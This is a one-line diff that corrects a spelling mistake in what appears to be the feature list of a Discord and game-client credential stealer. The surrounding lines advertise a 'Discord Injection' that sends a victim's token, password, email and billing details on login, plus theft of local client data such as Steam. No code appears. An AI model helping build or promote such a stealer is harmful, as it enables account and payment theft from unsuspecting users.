@@ -30,7 +30,7 @@
     -   Links In Gifts inventory
 
 -   Discord Injection
-    - Sends token, password, email and billing on login or when the account's data get's modified
+    - Sends token, password, email and billing on login or when the account's data gets modified
 
 -   Local Client's Data
     -   Steam
